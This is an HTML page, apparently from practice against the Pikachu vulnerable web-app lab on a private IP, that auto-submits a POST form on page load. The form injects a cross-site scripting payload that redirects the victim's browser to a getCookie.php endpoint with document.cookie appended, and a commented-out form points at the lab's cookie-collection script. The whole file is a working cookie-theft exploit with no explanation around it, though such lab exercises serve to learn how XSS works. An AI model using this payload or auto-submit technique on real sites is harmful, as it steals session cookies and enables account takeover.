<!DOCTYPE html>
<html>
    <head>
        <title></title>
        <script type ="text/javascript">
            window.onload = function(){
                document.getElementById("postsubmit").click();
            }
        </script>
    </head>
    <body>
        <!--<form action="http://192.168.124.8:80/pikachu-master/pkxss/xcookie/pkxss_cookie_result.php" method = "post">
        -->
        <form action="http://192.168.124.8:80/pikachu-master/test/test.php" method = "post">
            <input type="text" id="xssr_in" maxlength="2000" name="message" 
                   value="<script>document.location = 'http://192.168.124.8:80/pikachu-master/test/getCookie.php?cookie=' + document.cookie;</script>"
            >
             <input type ="submit" id ="postsubmit" name="submit" value="submit">
  
        </form>
    </body>
</html>
